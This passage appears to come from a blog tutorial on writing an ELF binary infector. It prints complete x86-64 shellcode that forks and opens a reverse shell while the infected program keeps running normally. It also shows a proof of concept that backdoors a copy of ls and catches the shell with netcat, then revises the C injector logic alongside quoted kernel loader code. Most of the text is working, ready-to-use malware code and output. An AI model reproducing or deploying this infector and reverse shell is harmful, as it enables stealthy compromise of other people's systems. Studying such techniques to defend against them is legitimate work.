</span></span></code></pre></div><p>This useful insight brought to you by netizen <em><strong>&ldquo;Gilles &lsquo;SO- stop being evil&rsquo;&rdquo; of StackOverflow</strong></em></p><p><code>Dup2</code> lets us duplicate the file descriptor to handle <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> pipes. After we decrement through the <code>dup2_loop</code>, we can use them with a shell.</p><p>So we build the <code>/bin/sh</code> pathname array and move it to <code>rbx</code>, followed by the <em>path</em> to the <em>argument</em> of the <em>pathname</em>!</p><p>Our final code looks like this, with <code>execve("/bin/sh", ["/bin/sh"], NULL)</code>. If all goes well, we receive a shell on our listener and the original behavior of our infected host program is preserved.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl><span class=k>BITS</span> <span class=mi>64</span>
</span></span><span class=line><span class=cl><span class=k>global</span> <span class=nv>_start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>section</span> <span class=nv>.text</span>
</span></span><span class=line><span class=cl><span class=nl>_start:</span>
</span></span><span class=line><span class=cl>                                <span class=c1>; save original stack pointer </span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nv>r12</span><span class=p>,</span> <span class=nb>rsp</span>                <span class=c1>; preserve rsp in r12</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                <span class=c1>; save all registers</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rax</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rbx</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rcx</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rdx</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rsi</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rdi</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rbp</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nv>r8</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nv>r9</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nv>r10</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nv>r11</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                <span class=c1>; fork to isolate shellcode execution</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rax</span><span class=p>,</span> <span class=mi>57</span>                 <span class=c1>; sys_fork</span>
</span></span><span class=line><span class=cl>    <span class=nf>syscall</span>
</span></span><span class=line><span class=cl>    <span class=nf>test</span> <span class=nb>rax</span><span class=p>,</span> <span class=nb>rax</span>
</span></span><span class=line><span class=cl>    <span class=nf>jnz</span> <span class=nv>parent</span>                  <span class=c1>; parent continues host execution</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>child_process:</span>
</span></span><span class=line><span class=cl>                                <span class=c1>; socket syscall</span>
</span></span><span class=line><span class=cl>                                <span class=c1>; int socket(int domain, int type, int protocol)</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rax</span><span class=p>,</span> <span class=mi>41</span>                 <span class=c1>; sys_socket</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rdi</span><span class=p>,</span> <span class=mi>2</span>                  <span class=c1>; AF_INET</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rsi</span><span class=p>,</span> <span class=mi>1</span>                  <span class=c1>; SOCK_STREAM</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rdx</span><span class=p>,</span> <span class=mi>6</span>                  <span class=c1>; IPPROTO_TCP</span>
</span></span><span class=line><span class=cl>    <span class=nf>syscall</span>
</span></span><span class=line><span class=cl>    <span class=nf>cmp</span> <span class=nb>rax</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=nf>jl</span> <span class=nv>exit</span>                     <span class=c1>; if socket fails, exit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                <span class=c1>; save socket file descriptor in rdi</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rdi</span><span class=p>,</span> <span class=nb>rax</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                <span class=c1>; connect syscall</span>
</span></span><span class=line><span class=cl>                                <span class=c1>; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rax</span><span class=p>,</span> <span class=mi>42</span>                 <span class=c1>; sys_connect</span>
</span></span><span class=line><span class=cl>                                <span class=c1>; build sockaddr_in structure on the stack</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>rdx</span><span class=p>,</span> <span class=nb>rdx</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rdx</span>                    <span class=c1>; null pad</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x0100007f</span>       <span class=c1>; 127.0.0.1, ip address</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x5c11</span>            <span class=c1>; port 4444, network byte order</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=kt>word</span> <span class=mi>2</span>                 <span class=c1>; AF_INET</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rsi</span><span class=p>,</span> <span class=nb>rsp</span>                <span class=c1>; pointer to sockaddr_in structure</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rdx</span><span class=p>,</span> <span class=mi>16</span>                 <span class=c1>; size of sockaddr_in</span>
</span></span><span class=line><span class=cl>    <span class=nf>syscall</span>
</span></span><span class=line><span class=cl>    <span class=nf>cmp</span> <span class=nb>rax</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=nf>jl</span> <span class=nv>exit</span>                     <span class=c1>; if connect fails, exit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                <span class=c1>; dup2 syscall: int dup2(int oldfd, int newfd)</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rsi</span><span class=p>,</span> <span class=mi>3</span>                  <span class=c1>; Start with stderr (2), work down to stdin (0)</span>
</span></span><span class=line><span class=cl><span class=nl>dup2_loop:</span>
</span></span><span class=line><span class=cl>    <span class=nf>dec</span> <span class=nb>rsi</span>                     <span class=c1>; Decrement file descriptor (2 -&gt; 1 -&gt; 0)</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rax</span><span class=p>,</span> <span class=mi>33</span>                 <span class=c1>; sys_dup2</span>
</span></span><span class=line><span class=cl>    <span class=nf>syscall</span>
</span></span><span class=line><span class=cl>    <span class=nf>jnz</span> <span class=nv>dup2_loop</span>               <span class=c1>; loop until rsi is 0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                <span class=c1>; execve syscall</span>
</span></span><span class=line><span class=cl>                                <span class=c1>; int execve(const char *pathname, char *const argv[], char *const envp[])</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>rax</span><span class=p>,</span> <span class=nb>rax</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rax</span>                    <span class=c1>; NULL terminator</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rbx</span><span class=p>,</span> <span class=mh>0x68732f6e69622f2f</span> <span class=c1>; &#34;//bin/sh&#34; in reverse byte order</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rbx</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rdi</span><span class=p>,</span> <span class=nb>rsp</span>                <span class=c1>; Pathname pointer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rax</span>                    <span class=c1>; NULL terminator for argv</span>
</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>rdi</span>                    <span class=c1>; pointer to the string &#34;//bin/sh&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rsi</span><span class=p>,</span> <span class=nb>rsp</span>                <span class=c1>; argv -&gt; [pointer_to_string, NULL]</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>rdx</span><span class=p>,</span> <span class=nb>rdx</span>                <span class=c1>; envp -&gt;NULL</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mi>59</span>                  <span class=c1>; syscall, execve</span>
</span></span><span class=line><span class=cl>    <span class=nf>syscall</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                <span class=c1>; if execve fails, exit</span>
</span></span><span class=line><span class=cl><span class=nl>exit:</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>rax</span><span class=p>,</span> <span class=nb>rax</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mi>60</span>                  <span class=c1>; sys_exit</span>
</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>rdi</span><span class=p>,</span> <span class=nb>rdi</span>
</span></span><span class=line><span class=cl>    <span class=nf>syscall</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>parent:</span>
</span></span><span class=line><span class=cl>                                <span class=c1>; restore registers and continue host execution</span>
</span></span><span class=line><span class=cl>    <span class=nf>pop</span> <span class=nv>r11</span>
</span></span><span class=line><span class=cl>    <span class=nf>pop</span> <span class=nv>r10</span>
</span></span><span class=line><span class=cl>    <span class=nf>pop</span> <span class=nv>r9</span>
</span></span><span class=line><span class=cl>    <span class=nf>pop</span> <span class=nv>r8</span>
</span></span><span class=line><span class=cl>    <span class=nf>pop</span> <span class=nb>rbp</span>
</span></span><span class=line><span class=cl>    <span class=nf>pop</span> <span class=nb>rdi</span>
</span></span><span class=line><span class=cl>    <span class=nf>pop</span> <span class=nb>rsi</span>
</span></span><span class=line><span class=cl>    <span class=nf>pop</span> <span class=nb>rdx</span>
</span></span><span class=line><span class=cl>    <span class=nf>pop</span> <span class=nb>rcx</span>
</span></span><span class=line><span class=cl>    <span class=nf>pop</span> <span class=nb>rbx</span>
</span></span><span class=line><span class=cl>    <span class=nf>pop</span> <span class=nb>rax</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rsp</span><span class=p>,</span> <span class=nv>r12</span>                <span class=c1>; restore stack pointer</span>
</span></span></code></pre></div><p>The last thing we do in order to ensure our exploit runs and lands smoothly is to <code>pop</code> all of our registers back in the proper reverse order that we pushed them &ndash; and then move the stack pointer we saved earlier in <code>r12</code> back to <code>rsp</code>.</p><h2 id=proof-of-concept>Proof of Concept<a hidden class=anchor aria-hidden=true href=#proof-of-concept>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ gcc -o elf_infector elf_infector.c
</span></span><span class=line><span class=cl>$ cp $(which ls) ls
</span></span><span class=line><span class=cl>$ nasm -o shellcode shellcode.s
</span></span><span class=line><span class=cl>$ ./elf_infector ./ls shellcode
</span></span><span class=line><span class=cl>[+] Found PT_NOTE section
</span></span><span class=line><span class=cl>[+] Changing to PT_LOAD
</span></span><span class=line><span class=cl>[+] Patched e_entry
</span></span><span class=line><span class=cl>$ ./ls
</span></span><span class=line><span class=cl>elf_infector  elf_infector.c  ls  shellcode  shellcode.s
</span></span></code></pre></div><p>Meanwhile&mldr; in our other console:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ nc -lvnp 4444
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 4444
</span></span><span class=line><span class=cl>Connection received on 127.0.0.1 51020
</span></span><span class=line><span class=cl>cat /etc/issue
</span></span><span class=line><span class=cl>Ubuntu 24.04.2 LTS \n \l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>uname -a
</span></span><span class=line><span class=cl>Linux vr 6.8.0-53-generic #55-Ubuntu SMP PREEMPT_DYNAMIC Fri Jan 17 15:37:52 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
</span></span></code></pre></div><p><a href=https://github.com/hexagr/elf_infector>ELF Infector on Github.</a></p><h2 id=v2>V2<a hidden class=anchor aria-hidden=true href=#v2>#</a></h2><p>You might have noticed a possible discrepancy in the core functionality of our program where we modify the program headers. We added the <code>sc_len</code> derived from our <code>shellcode_len</code> value to the <code>p_filesz</code> and <code>p_memsz</code> to make room for our shellcode.</p><p>In that scenario, we called the <code>patch</code> function <em>afterward</em>, which modifies both the <code>shellcode_len</code> and shellcode buffer, extending them both before pointing them to a new shellcode buffer and length. And afterward, we then write it back to the ELF file.</p><p>But the ELF segment modififications we specified before in the <code>PT_LOAD</code> segment &ndash; <code>p_filesz</code> and <code>p_memsz</code> &ndash; still have the <em>old</em> shellcode length.</p><p>Luckily, memory from <code>p_filesz</code> through <code>p_memsz</code> <a href=https://codebrowser.dev/linux/linux/fs/binfmt_elf.c.html#396>actually gets rounded</a> up to the next page size for alignment purposes. So our patched shellcode still runs even though we didn&rsquo;t specify the new length when manipulating the <code>PT_LOAD</code> fields.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * Map &#34;eppnt-&gt;p_filesz&#34; bytes from &#34;filep&#34; offset &#34;eppnt-&gt;p_offset&#34;
</span></span></span><span class=line><span class=cl><span class=cm> * into memory at &#34;addr&#34;. (Note that p_filesz is rounded up to the
</span></span></span><span class=line><span class=cl><span class=cm> * next page, so any extra bytes from the file must be wiped.)
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>elf_map</span><span class=p>(</span><span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>filep</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>addr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=k>struct</span> <span class=n>elf_phdr</span> <span class=o>*</span><span class=n>eppnt</span><span class=p>,</span> <span class=kt>int</span> <span class=n>prot</span><span class=p>,</span> <span class=kt>int</span> <span class=n>type</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>total_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>map_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>size</span> <span class=o>=</span> <span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_filesz</span> <span class=o>+</span> <span class=nf>ELF_PAGEOFFSET</span><span class=p>(</span><span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_vaddr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>off</span> <span class=o>=</span> <span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_offset</span> <span class=o>-</span> <span class=nf>ELF_PAGEOFFSET</span><span class=p>(</span><span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_vaddr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>addr</span> <span class=o>=</span> <span class=nf>ELF_PAGESTART</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>size</span> <span class=o>=</span> <span class=nf>ELF_PAGEALIGN</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* mmap() will return -EINVAL if given a zero size, but a
</span></span></span><span class=line><span class=cl><span class=cm>   * segment with zero filesize is perfectly valid */</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>  * total_size is the size of the ELF (interpreter) image.
</span></span></span><span class=line><span class=cl><span class=cm>  * The _first_ mmap needs to know the full size, otherwise
</span></span></span><span class=line><span class=cl><span class=cm>  * randomization might put this image into an overlapping
</span></span></span><span class=line><span class=cl><span class=cm>  * position with the ELF binary image. (since size &lt; total_size)
</span></span></span><span class=line><span class=cl><span class=cm>  * So we first map the &#39;big&#39; image - and unmap the remainder at
</span></span></span><span class=line><span class=cl><span class=cm>  * the end. (which unmap is needed for ELF images with holes.)
</span></span></span><span class=line><span class=cl><span class=cm>  */</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>total_size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>total_size</span> <span class=o>=</span> <span class=nf>ELF_PAGEALIGN</span><span class=p>(</span><span class=n>total_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>map_addr</span> <span class=o>=</span> <span class=nf>vm_mmap</span><span class=p>(</span><span class=n>filep</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>total_size</span><span class=p>,</span> <span class=n>prot</span><span class=p>,</span> <span class=n>type</span><span class=p>,</span> <span class=n>off</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>BAD_ADDR</span><span class=p>(</span><span class=n>map_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>      <span class=nf>vm_munmap</span><span class=p>(</span><span class=n>map_addr</span><span class=o>+</span><span class=n>size</span><span class=p>,</span> <span class=n>total_size</span><span class=o>-</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=n>map_addr</span> <span class=o>=</span> <span class=nf>vm_mmap</span><span class=p>(</span><span class=n>filep</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>prot</span><span class=p>,</span> <span class=n>type</span><span class=p>,</span> <span class=n>off</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>((</span><span class=n>type</span> <span class=o>&amp;</span> <span class=n>MAP_FIXED_NOREPLACE</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>      <span class=nf>PTR_ERR</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>map_addr</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=n>EEXIST</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>pr_info</span><span class=p>(</span><span class=s>&#34;%d (%s): Uhuuh, elf segment at %px requested but the memory is mapped already</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nf>task_pid_nr</span><span class=p>(</span><span class=n>current</span><span class=p>),</span> <span class=n>current</span><span class=o>-&gt;</span><span class=n>comm</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span><span class=p>(</span><span class=n>map_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>And:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * Map &#34;eppnt-&gt;p_filesz&#34; bytes from &#34;filep&#34; offset &#34;eppnt-&gt;p_offset&#34;
</span></span></span><span class=line><span class=cl><span class=cm> * into memory at &#34;addr&#34;. Memory from &#34;p_filesz&#34; through &#34;p_memsz&#34;
</span></span></span><span class=line><span class=cl><span class=cm> * rounded up to the next page is zeroed.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>elf_load</span><span class=p>(</span><span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>filep</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>addr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=k>struct</span> <span class=n>elf_phdr</span> <span class=o>*</span><span class=n>eppnt</span><span class=p>,</span> <span class=kt>int</span> <span class=n>prot</span><span class=p>,</span> <span class=kt>int</span> <span class=n>type</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>total_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>zero_start</span><span class=p>,</span> <span class=n>zero_end</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>map_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_filesz</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>map_addr</span> <span class=o>=</span> <span class=nf>elf_map</span><span class=p>(</span><span class=n>filep</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>eppnt</span><span class=p>,</span> <span class=n>prot</span><span class=p>,</span> <span class=n>type</span><span class=p>,</span> <span class=n>total_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>BAD_ADDR</span><span class=p>(</span><span class=n>map_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=n>map_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_memsz</span> <span class=o>&gt;</span> <span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_filesz</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>zero_start</span> <span class=o>=</span> <span class=n>map_addr</span> <span class=o>+</span> <span class=nf>ELF_PAGEOFFSET</span><span class=p>(</span><span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_vaddr</span><span class=p>)</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_filesz</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>zero_end</span> <span class=o>=</span> <span class=n>map_addr</span> <span class=o>+</span> <span class=nf>ELF_PAGEOFFSET</span><span class=p>(</span><span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_vaddr</span><span class=p>)</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_memsz</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>       * Zero the end of the last mapped page but ignore
</span></span></span><span class=line><span class=cl><span class=cm>       * any errors if the segment isn&#39;t writable.
</span></span></span><span class=line><span class=cl><span class=cm>       */</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=nf>padzero</span><span class=p>(</span><span class=n>zero_start</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>prot</span> <span class=o>&amp;</span> <span class=n>PROT_WRITE</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=n>EFAULT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>map_addr</span> <span class=o>=</span> <span class=n>zero_start</span> <span class=o>=</span> <span class=nf>ELF_PAGESTART</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>zero_end</span> <span class=o>=</span> <span class=n>zero_start</span> <span class=o>+</span> <span class=nf>ELF_PAGEOFFSET</span><span class=p>(</span><span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_vaddr</span><span class=p>)</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>      <span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_memsz</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_memsz</span> <span class=o>&gt;</span> <span class=n>eppnt</span><span class=o>-&gt;</span><span class=n>p_filesz</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * Map the last of the segment.
</span></span></span><span class=line><span class=cl><span class=cm>     * If the header is requesting these pages to be
</span></span></span><span class=line><span class=cl><span class=cm>     * executable, honour that (ppc32 needs this).
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>zero_start</span> <span class=o>=</span> <span class=nf>ELF_PAGEALIGN</span><span class=p>(</span><span class=n>zero_start</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>zero_end</span> <span class=o>=</span> <span class=nf>ELF_PAGEALIGN</span><span class=p>(</span><span class=n>zero_end</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>error</span> <span class=o>=</span> <span class=nf>vm_brk_flags</span><span class=p>(</span><span class=n>zero_start</span><span class=p>,</span> <span class=n>zero_end</span> <span class=o>-</span> <span class=n>zero_start</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=n>prot</span> <span class=o>&amp;</span> <span class=n>PROT_EXEC</span> <span class=o>?</span> <span class=nl>VM_EXEC</span> <span class=p>:</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>error</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>map_addr</span> <span class=o>=</span> <span class=n>error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>map_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Our original proof of concept works fine. But we can rewrite the logic like this, calling the <code>patch</code> function first, getting the updated shellcode length <em>before modifying</em> <code>p_filesz</code> and <code>p_memsz</code>. I mean, if we were going to be pedantic about it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>    <span class=c1>// Patch shellcode to jump to the original entry point after finishing
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// We&#39;ll be setting e_entry to memory_offset, so we we&#39;ll pass it
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// ahead of time to the patch function 
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>patch</span><span class=p>(</span><span class=o>&amp;</span><span class=n>shellcode</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>shellcode_len</span><span class=p>,</span> <span class=n>memory_offset</span><span class=p>,</span> <span class=n>original_entry</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// After the patch function executes, our shellcode length and buffer 
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// are different. Update sc_len to the patched length to be pedantic
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>uint64_t</span> <span class=n>sc_len</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>shellcode_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Look for PT_NOTE section
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>elf_header</span><span class=o>-&gt;</span><span class=n>e_phnum</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_type</span> <span class=o>==</span> <span class=n>PT_NOTE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Convert to a PT_LOAD section with values to load shellcode
